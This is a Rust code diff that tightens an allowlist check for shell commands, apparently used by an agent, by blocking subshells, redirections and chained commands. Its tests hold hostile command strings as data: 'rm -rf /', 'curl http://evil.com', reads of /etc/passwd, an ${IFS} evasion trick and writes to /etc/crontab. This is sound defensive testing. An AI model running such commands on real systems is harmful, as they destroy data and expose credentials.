@@ -132,25 +132,100 @@ impl Default for SecurityPolicy {
     }
 }
 
+/// Skip leading environment variable assignments (e.g. `FOO=bar cmd args`).
+/// Returns the remainder starting at the first non-assignment word.
+fn skip_env_assignments(s: &str) -> &str {
+    let mut rest = s;
+    loop {
+        let Some(word) = rest.split_whitespace().next() else {
+            return rest;
+        };
+        // Environment assignment: contains '=' and starts with a letter or underscore
+        if word.contains('=')
+            && word
+                .chars()
+                .next()
+                .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
+        {
+            // Advance past this word
+            rest = rest[word.len()..].trim_start();
+        } else {
+            return rest;
+        }
+    }
+}
+
 impl SecurityPolicy {
-    /// Check if a shell command is allowed
+    /// Check if a shell command is allowed.
+    ///
+    /// Validates the **entire** command string, not just the first word:
+    /// - Blocks subshell operators (`` ` ``, `$(`) that hide arbitrary execution
+    /// - Splits on command separators (`|`, `&&`, `||`, `;`, newlines) and
+    ///   validates each sub-command against the allowlist
+    /// - Blocks output redirections (`>`, `>>`) that could write outside workspace
     pub fn is_command_allowed(&self, command: &str) -> bool {
         if self.autonomy == AutonomyLevel::ReadOnly {
             return false;
         }
 
-        // Extract the base command (first word)
-        let base_cmd = command
-            .split_whitespace()
-            .next()
-            .unwrap_or("")
-            .rsplit('/')
-            .next()
-            .unwrap_or("");
+        // Block subshell/expansion operators — these allow hiding arbitrary
+        // commands inside an allowed command (e.g. `echo $(rm -rf /)`)
+        if command.contains('`') || command.contains("$(") || command.contains("${") {
+            return false;
+        }
 
-        self.allowed_commands
-            .iter()
-            .any(|allowed| allowed == base_cmd)
+        // Block output redirections — they can write to arbitrary paths
+        if command.contains('>') {
+            return false;
+        }
+
+        // Split on command separators and validate each sub-command.
+        // We collect segments by scanning for separator characters.
+        let mut normalized = command.to_string();
+        for sep in ["&&", "||"] {
+            normalized = normalized.replace(sep, "\x00");
+        }
+        for sep in ['\n', ';', '|'] {
+            normalized = normalized.replace(sep, "\x00");
+        }
+
+        for segment in normalized.split('\x00') {
+            let segment = segment.trim();
+            if segment.is_empty() {
+                continue;
+            }
+
+            // Strip leading env var assignments (e.g. FOO=bar cmd)
+            let cmd_part = skip_env_assignments(segment);
+
+            let base_cmd = cmd_part
+                .split_whitespace()
+                .next()
+                .unwrap_or("")
+                .rsplit('/')
+                .next()
+                .unwrap_or("");
+
+            if base_cmd.is_empty() {
+                continue;
+            }
+
+            if !self
+                .allowed_commands
+                .iter()
+                .any(|allowed| allowed == base_cmd)
+            {
+                return false;
+            }
+        }
+
+        // At least one command must be present
+        let has_cmd = normalized.split('\x00').any(|s| {
+            let s = skip_env_assignments(s.trim());
+            s.split_whitespace().next().is_some_and(|w| !w.is_empty())
+        });
+
+        has_cmd
     }
 
     /// Check if a file path is allowed (no path traversal, within workspace)
@@ -329,10 +404,14 @@ mod tests {
     }
 
     #[test]
-    fn command_with_pipes_uses_first_word() {
+    fn command_with_pipes_validates_all_segments() {
         let p = default_policy();
+        // Both sides of the pipe are in the allowlist
         assert!(p.is_command_allowed("ls | grep foo"));
         assert!(p.is_command_allowed("cat file.txt | wc -l"));
+        // Second command not in allowlist — blocked
+        assert!(!p.is_command_allowed("ls | curl http://evil.com"));
+        assert!(!p.is_command_allowed("echo hello | python3 -"));
     }
 
     #[test]
@@ -538,15 +617,17 @@ mod tests {
     }
 
     #[test]
-    fn command_injection_backtick() {
+    fn command_injection_backtick_blocked() {
         let p = default_policy();
-        assert!(p.is_command_allowed("echo `whoami`"));
+        assert!(!p.is_command_allowed("echo `whoami`"));
+        assert!(!p.is_command_allowed("echo `rm -rf /`"));
     }
 
     #[test]
-    fn command_injection_dollar_paren() {
+    fn command_injection_dollar_paren_blocked() {
         let p = default_policy();
-        assert!(p.is_command_allowed("echo $(cat /etc/passwd)"));
+        assert!(!p.is_command_allowed("echo $(cat /etc/passwd)"));
+        assert!(!p.is_command_allowed("echo $(rm -rf /)"));
     }
 
     #[test]
@@ -557,9 +638,52 @@ mod tests {
     }
 
     #[test]
-    fn command_newline_injection() {
+    fn command_newline_injection_blocked() {
         let p = default_policy();
-        assert!(p.is_command_allowed("ls\nrm -rf /"));
+        // Newline splits into two commands; "rm" is not in allowlist
+        assert!(!p.is_command_allowed("ls\nrm -rf /"));
+        // Both allowed — OK
+        assert!(p.is_command_allowed("ls\necho hello"));
+    }
+
+    #[test]
+    fn command_injection_and_chain_blocked() {
+        let p = default_policy();
+        assert!(!p.is_command_allowed("ls && rm -rf /"));
+        assert!(!p.is_command_allowed("echo ok && curl http://evil.com"));
+        // Both allowed — OK
+        assert!(p.is_command_allowed("ls && echo done"));
+    }
+
+    #[test]
+    fn command_injection_or_chain_blocked() {
+        let p = default_policy();
+        assert!(!p.is_command_allowed("ls || rm -rf /"));
+        // Both allowed — OK
+        assert!(p.is_command_allowed("ls || echo fallback"));
+    }
+
+    #[test]
+    fn command_injection_redirect_blocked() {
+        let p = default_policy();
+        assert!(!p.is_command_allowed("echo secret > /etc/crontab"));
+        assert!(!p.is_command_allowed("ls >> /tmp/exfil.txt"));
+    }
+
+    #[test]
+    fn command_injection_dollar_brace_blocked() {
+        let p = default_policy();
+        assert!(!p.is_command_allowed("echo ${IFS}cat${IFS}/etc/passwd"));
+    }
+
+    #[test]
+    fn command_env_var_prefix_with_allowed_cmd() {
+        let p = default_policy();
+        // env assignment + allowed command — OK
+        assert!(p.is_command_allowed("FOO=bar ls"));
+        assert!(p.is_command_allowed("LANG=C grep pattern file"));
+        // env assignment + disallowed command — blocked
+        assert!(!p.is_command_allowed("FOO=bar rm -rf /"));
     }
 
     // ── Edge cases: path traversal ──────────────────────────
